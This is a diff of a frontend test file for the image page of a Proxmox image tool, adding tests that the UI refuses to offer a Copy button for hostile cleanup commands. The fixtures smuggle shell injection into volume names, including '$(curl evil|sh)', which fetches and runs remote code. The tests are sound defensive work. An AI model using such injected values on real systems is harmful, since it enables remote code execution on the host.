@@ -64,6 +64,34 @@ describe("image page", () => {
     expect(document.querySelector("#last-failed")).toBeNull(); // the last build is v3, ready
   });
 
+  it("offers Copy only for Plumb's own pvesm line (review S1)", async () => {
+    const api = adminApi();
+    const real = await api.getImage("ubuntu-web");
+    const st = real.status;
+    if (!st) throw new Error("no status");
+    const bad = "pvesm free plumb-images:import/plumb-x;$(curl evil|sh) 'a\"-0b1c2d3e4f5a.qcow2";
+    st.unused_imports = [
+      ...st.unused_imports,
+      { volume: "plumb-images:import/x;$(curl evil|sh)", command: bad, size_bytes: 1024 },
+    ];
+    vi.spyOn(api, "getImage").mockResolvedValue(real);
+    show(ImageScreen, { api, name: "ubuntu-web" });
+    await until(() => text().includes("Unused import files") && text().includes("pvesm free"));
+    expect(text()).not.toContain(bad);
+    expect(text()).toContain("Check it by hand on the Proxmox host");
+    const copies = [...document.querySelectorAll("button")].filter((b) =>
+      b.textContent?.startsWith("Copy"),
+    );
+    expect(copies).toHaveLength(st.unused_imports.length - 1);
+  });
+
+  it("the Versions table scrolls with the keyboard (review N3)", async () => {
+    show(ImageScreen, { api: adminApi(), name: "ubuntu-web" });
+    const wrap = await until(() => document.querySelector<HTMLElement>(".table-wrap"));
+    expect(wrap.getAttribute("tabindex")).toBe("0");
+    expect(wrap.getAttribute("aria-label")).toContain("Versions of image ubuntu-web");
+  });
+
   it("Build now makes a build Plan", async () => {
     const api = adminApi();
     const build = vi.spyOn(api, "buildImage");
@@ -308,16 +336,24 @@ describe("Run and Target screens", () => {
 });
 
 describe("image acceptance gaps", () => {
-  it("preserves shell quoting when copying an import command", async () => {
+  it("copies a valid import command exactly and refuses a hostile one (S1)", async () => {
     const api = adminApi();
     const view = await api.getImage("ubuntu-web");
     if (!view.status) throw new Error("no status");
-    const volume = "store:import/image' ; $(printf INJECTED) `printf INJECTED` & file.qcow2";
-    // The API quotes the command; the UI must preserve it exactly.
-    const command = `pvesm free '${volume.replaceAll("'", "'\\''")}'`;
+    const hostileVolume = "store:import/image' ; $(printf INJECTED) `printf INJECTED` & file.qcow2";
+    // A quoted line is still no line of Plumb's own form: no Copy (review S1).
+    const hostile = `pvesm free '${hostileVolume.replaceAll("'", "'\\''")}'`;
+    const volume = "plumb-images:import/plumb-ubuntu-web-0b1c2d3e4f5a.qcow2";
+    const command = `pvesm free ${volume}`;
     vi.spyOn(api, "getImage").mockResolvedValue({
       ...view,
-      status: { ...view.status, unused_imports: [{ volume, command, size_bytes: 1024 }] },
+      status: {
+        ...view.status,
+        unused_imports: [
+          { volume: hostileVolume, command: hostile, size_bytes: 1024 },
+          { volume, command, size_bytes: 1024 },
+        ],
+      },
     });
     const writeText = vi.fn().mockResolvedValue(undefined);
     const clipboard = vi
@@ -327,6 +363,8 @@ describe("image acceptance gaps", () => {
       show(ImageScreen, { api, name: "ubuntu-web" });
       (await until(() => button(/^Copy/))).click();
       await until(() => writeText.mock.calls.length);
+      expect(document.querySelectorAll(".cmd")).toHaveLength(1);
+      expect(text()).not.toContain(hostile);
       const copied = writeText.mock.calls[0]?.[0] as string;
       expect(copied).toBe(command);
       expect(el(".cmd code").textContent).toBe(command);
